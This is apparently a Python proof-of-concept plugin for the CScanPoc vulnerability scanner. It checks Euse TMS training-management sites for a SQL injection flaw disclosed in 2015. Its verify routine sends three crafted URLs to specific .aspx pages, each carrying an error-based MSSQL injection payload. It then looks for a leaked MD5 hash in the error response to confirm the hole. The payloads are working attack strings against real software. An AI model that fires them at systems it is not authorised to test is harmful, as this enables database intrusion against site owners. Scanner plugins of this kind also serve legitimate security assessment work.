# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'euse_study_0006' # 平台漏洞编号，留空
    name = 'Euse TMS存在多处DBA权限SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-11-19'  # 漏洞公布时间
    desc = '''
        Euse TMS存在多处DBA权限SQL注入
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=135012' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Euse TMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '65c07aab-e8de-47fd-988c-d96440c42c3b'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                "/Knowledge/PersonalQuestionsList.aspx?userid=1and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--",
                "/Course/CourseCommentList.aspx?type=2and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&targetid=2",
                "/Plan/plancommentlist.aspx?type=3and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&targetid=1",
            ]
            for p in ps:
                url=arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code==500 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()